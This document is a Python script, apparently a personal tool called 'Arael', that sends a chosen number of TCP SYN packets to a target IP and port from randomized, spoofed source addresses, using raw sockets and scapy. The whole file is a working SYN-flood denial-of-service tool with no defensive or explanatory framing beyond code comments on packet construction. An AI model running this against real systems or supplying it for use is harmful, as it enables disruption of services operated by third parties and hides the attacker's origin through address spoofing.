#!/usr/bin/python3

from argparse import ArgumentParser
from random import randint
import struct
import array
import socket
from scapy.all import IP, TCP, send

# Calculate Checksum for TCP Packet

def cal_checksum(packet: bytes) ->int:
    if len(packet) % 2 != 0:
        packet += b'\0'
    # Convert Byte packet into aray of unsigned 16-bit ints and sum the values 
    res = sum(array.array("H", packet))
    # Extract the upper carry and lower 16 bit 
    res = (res >> 16) + (res & 0xffff)
    # Final Carry Fold if the sum still exceeds 16 bit
    res += res >> 16
    # Flip bits of the sum and mask the lower 16 to produce the checksum
    return(~res) & 0xffff


# Generate a randomized IP to sent the SYN packets from

def rand_ip():
    ip = [randint(0,255) for _ in range(4)]
    rand_ip = ".".join(map(str, ip))
     
    return(rand_ip)

# Generate random port if

def rand_port():
    port = randint(1000,9000)
    return port

def build(src_host, src_port, dst_host, dst_port, flags ):
        # This builds the entire TCP Packet
    packet = struct.pack(
        # !:Data should be packed in big-endian
        # H: unsigned short(2 Bytes each)
        # I: unsigned int(4 Bytes each)
        # B: unsigned char(1 Byte each)
        # We do this so pack knows how and in which order to pack everything
        '!HHIIBBHHH',

        #We need the following fields to construct a valid TCP Header
        src_port,  # Source Port
        dst_port,  # Destination Port
        0,              # Seq Number
        0,              # Ack Number
        5 << 4,         # Offset
        flags,     # TCP Flags
        8192,           # Sliding Window Value
        0,              # Checksum (init, will be calculated later)
        0               # Urgent pointer
    )


    # Construct pseudo header for TCP -> we need this for the Checksum to be valid
    """
        Composition of pseudo header:
    _________________________________
            | Src IP |
    _________________________________
            | Dst IP |
    _________________________________
    | Reserved | Protocol | TCP len |
    
    """
    pseudohdr = struct.pack(
        '!4s4sHH',
        socket.inet_aton(src_host),#Src address
        socket.inet_aton(dst_host),#Dst address
        socket.IPPROTO_TCP,
        len(packet)
    )
    # Construct checksum
    checksum = cal_checksum(pseudohdr + packet)
        
    packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
    
    return packet


def args():
    # Define command-line args -> needed to check input
    parser = ArgumentParser()
    parser.add_argument('-t', '--target', action='store', help='Specify the target IP address')
    parser.add_argument('-p','--port', action='store',type=int, help='Specify the target port')
    parser.add_argument('-c', '--count', action='store', type=int, help='Specify the amount of packets sent')
    
    args = parser.parse_args()

    if args.target and args.port and args.count: 
        print("Arguments parsed")
    else:
        if args.target is None:
            raise ValueError("Error: --t or --target is required.")
        if args.port is None:
            raise ValueError("Error: --p or --port is required.")
        if args.count is None:
            raise ValueError("Error: --c or --count is required.")
   
    return args 

def display_interface(trg_ip, trg_p):
    # Hardcoded ASCII art interface
    interface = f"""
    +----------------------------+
                Arael
    +----------------------------+
    | Trg IP:   = {trg_ip} 
    | Trg Port: = {trg_p}  
    +----------------------------+
    """
    print(interface)


def legacy_send():
    try:
            
            parsed_args = args()
            for x in range (parsed_args.count):
               ip = rand_ip()
               port = rand_port()
               display_interface(parsed_args.target, parsed_args.port)
               pak = build(
                ip,
                port,
                parsed_args.target,
                parsed_args.port,
                # We need the following bin sequence to define a syn packet
                0b000000010           
               )
               print(pak)
               sok = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
               sok.sendto(pak,(parsed_args.target,0)) 
               x=x+1

            

    except ValueError as e:   
            print(e)        


def send_tcp():
    total = 0
    parsed_args = args() 
    print("IPv4 Packets are sending ...")
    display_interface(parsed_args.target, parsed_args.port)

    for total in range(0, parsed_args.count):
        s_port = rand_port()
        s_eq = rand_port()
        w_indow = rand_port()

        IP_Packet = IP()
        IP_Packet.src = rand_ip()
        IP_Packet.dst = parsed_args.target

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = parsed_args.port
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
        print('.', end='', flush=True)



if __name__ == "__main__":
 send_tcp() 
	
